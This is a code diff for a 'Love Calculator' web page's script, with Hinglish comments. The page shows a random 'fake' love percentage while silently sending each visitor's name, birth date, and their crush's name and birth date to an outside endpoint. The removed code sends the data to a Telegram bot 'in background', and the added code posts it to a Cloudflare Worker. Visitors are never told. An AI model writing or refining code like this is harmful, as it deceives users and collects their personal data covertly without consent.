@@ -1,33 +1,22 @@
-// ⚠️ BOT TOKEN public GitHub pe mat rakho
-const BOT_TOKEN = "PASTE_NEW_TOKEN_HERE";
-const CHAT_ID = "8413629225";
+// ✅ Cloudflare Worker URL (yahin apna actual URL rakho)
+const WORKER_URL = "https://lovecalculatorr.vocabfood.workers.dev";
 
-function sendToTelegram(yourName, yourDOB, crushName, crushDOB) {
-  const message = `
-📩 New Submission Received
-
-👤 Name: ${yourName}
-🎂 DOB: ${yourDOB}
-
-❤️ Crush Name: ${crushName}
-🎂 Crush DOB: ${crushDOB}
-
-🌐 Source: Love Calculator
-`;
-
+function sendDataToWorker(yourName, yourDOB, crushName, crushDOB) {
   try {
-    fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+    fetch(WORKER_URL, {
       method: "POST",
       headers: {
         "Content-Type": "application/json"
       },
       body: JSON.stringify({
-        chat_id: CHAT_ID,
-        text: message
+        yourName: yourName,
+        yourDOB: yourDOB,
+        crushName: crushName,
+        crushDOB: crushDOB
       })
     });
   } catch (error) {
-    console.log("Message could not be sent");
+    console.log("Worker request failed");
   }
 }
 
@@ -37,22 +26,23 @@ function calculateLove() {
   const crushName = document.getElementById("crushName").value.trim();
   const crushDOB = document.getElementById("crushDOB").value;
 
-  if (!yourName || !crushName || !yourDOB || !crushDOB) {
+  if (!yourName || !yourDOB || !crushName || !crushDOB) {
     alert("Please enter all details ❤️");
     return;
   }
 
-  // Data Telegram ko bhejo (background me)
-  sendToTelegram(yourName, yourDOB, crushName, crushDOB);
+  // ✅ Backend (Cloudflare Worker) ko data bhejo
+  sendDataToWorker(yourName, yourDOB, crushName, crushDOB);
 
-  const lovePercent = Math.floor(Math.random() * 20) + 70;
+  // ✅ Fake love percentage
+  const lovePercent = Math.floor(Math.random() * 30) + 70; // 70–99%
 
   localStorage.setItem("yourName", yourName);
   localStorage.setItem("crushName", crushName);
   localStorage.setItem("lovePercent", lovePercent);
 
-  // Redirect forcefully
+  // ✅ Redirect (backend fail ho tab bhi)
   setTimeout(() => {
     window.location.href = "love.html";
-  }, 300);
+  }, 200);
 }
